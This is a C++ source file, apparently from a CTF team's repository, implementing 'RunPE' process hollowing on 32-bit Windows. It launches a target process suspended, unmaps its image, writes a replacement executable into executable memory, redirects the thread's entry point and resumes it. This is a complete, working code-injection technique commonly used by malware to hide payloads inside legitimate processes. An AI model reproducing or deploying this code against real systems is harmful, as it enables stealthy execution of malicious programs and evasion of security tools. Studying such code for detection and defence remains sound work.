// https://github.com/TeamCTF-PRIME/RunPE/blob/master/RunPE/RunPE.cpp

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "Header.h"


CONTEXT ctx;

DWORD GetPEB(HANDLE hProcess, HANDLE hThread) {
	
	DWORD	ImageBase;
	
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;
	
	if (!GetThreadContext(hThread, &ctx)) {
		printf("[-] failed GetThreadContext Function\n");
		return -1;
	}

	printf("\t - Image EntryPoint (EAX) : 0x%x\n", ctx.Eax);
	printf("\t - ImageBase (EBX) : 0x%x\n", ctx.Ebx);


	ReadProcessMemory(hProcess, (LPCVOID)ctx.Ebx, &ImageBase, 4, NULL);
	if(ImageBase == NULL) {
		printf("[-] failed ReadProcessMemory Function\n");
		return -1;
	}

	return ImageBase;
}

int main(int argc, char * argv[]) {
	
	HANDLE hFile		= NULL;

	DWORD cnt			= 0;
	DWORD ImageBase		= NULL;
	
	LPVOID pRemoteAddr	= NULL;

	LPSTR szProcess		= NULL;
	LPSTR szExe			= NULL;	

	fnNtUnmapViewOfSection NtUnmapViewOfSection;
	
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	PIMAGE_DOS_HEADER	IDH;
	PIMAGE_NT_HEADERS32	INH;
	PIMAGE_SECTION_HEADER	ISH;

	MAPPEDFILE mFile;


	if(argv[1] == NULL || argv[2] == NULL) {
		printf("[+] usage: ProcessHollowing.exe [PROCESS] [REPLACEMENT EXE]\n");
		return -1;
	
	}

	szProcess = argv[1];
	szExe = argv[2];

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));

	if(!CreateProcessA(szProcess, NULL, 0, 0, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &si, &pi)) {
		printf("[-] failed CreateProcess Function\n");
		return -1;
	}

	mFile.hFile = CreateFileA((LPCSTR)szExe, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(mFile.hFile != INVALID_HANDLE_VALUE) {
		mFile.dwFileSize = GetFileSize(mFile.hFile, NULL);
		if (mFile.dwFileSize != 0) {
			mFile.hMapfile = CreateFileMappingA(mFile.hFile, NULL, PAGE_READONLY | SEC_COMMIT, 0, mFile.dwFileSize, NULL);
			if (mFile.hMapfile != NULL) {
				mFile.lpView = MapViewOfFile(mFile.hMapfile, FILE_MAP_READ, 0, 0, 0);
			}
		}
	}

	ImageBase = GetPEB(pi.hProcess, pi.hThread);

	IDH = (PIMAGE_DOS_HEADER)(mFile.lpView);
	INH = (PIMAGE_NT_HEADERS32)((DWORD)mFile.lpView + IDH->e_lfanew);

	printf("\n");
	printf("\t - Machine : %x\n", INH->FileHeader.Machine);
	printf("\t - NumberOfSections : %d\n", INH->FileHeader.NumberOfSections);

	NtUnmapViewOfSection = (fnNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	printf("NtUnmapViewOfSection Address = 0x%x\n", NtUnmapViewOfSection);
	if(NtUnmapViewOfSection == NULL) {
		printf("[-] failed GetProcAddress Function\n");
		return -1;
	}

	NtUnmapViewOfSection(pi.hProcess, (PVOID)ctx.Ebx);

	pRemoteAddr = VirtualAllocEx(pi.hProcess, (LPVOID)ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(!pRemoteAddr) {
		printf("[-] failed VirtualAllocEx Function\n");
		return -1;
	}

	printf("pRemoteAddr = 0x%x\n", pRemoteAddr);
	printf("Source ImageBase : 0x%x\n", INH->OptionalHeader.ImageBase);
	printf("Destination ImageBase : 0x%x\n", (DWORD)ImageBase);


	if(!WriteProcessMemory(pi.hProcess, (LPVOID)ImageBase, mFile.lpView, INH->OptionalHeader.SizeOfHeaders, NULL)) {
		printf("failed WriteProcessMemory Function\n");
		return -1;
	}
	
	for (cnt = 0; cnt < INH->FileHeader.NumberOfSections; cnt++) {
		ISH = (PIMAGE_SECTION_HEADER)((DWORD)mFile.lpView + IDH->e_lfanew + 248 + (cnt * 40));
		
		printf("Section %s : \n", ISH->Name);
		printf("\t - Virtual Address : 0x%x\n", ISH->VirtualAddress);
		printf("\t - Raw Size : 0x%d\n", ISH->SizeOfRawData);
		printf("\t - Pointer to Raw Data : 0x%x\n", ISH->PointerToRawData);
		printf("\t - Characteristics : 0x%x\n", ISH->Characteristics);
		
		WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pRemoteAddr + ISH->VirtualAddress), (LPCVOID)((DWORD)mFile.lpView + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
	}

	WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &pRemoteAddr, 4, NULL);

	ctx.Ebx = (DWORD)pRemoteAddr;
	ctx.Eax = INH->OptionalHeader.ImageBase + INH->OptionalHeader.AddressOfEntryPoint;

	SetThreadContext(pi.hThread, &ctx);
	printf("[+] Success SetThreadContext Function\n");

	ResumeThread(pi.hThread);
	printf("[+] Success ResumeThread Function\n");

	return 0;
}

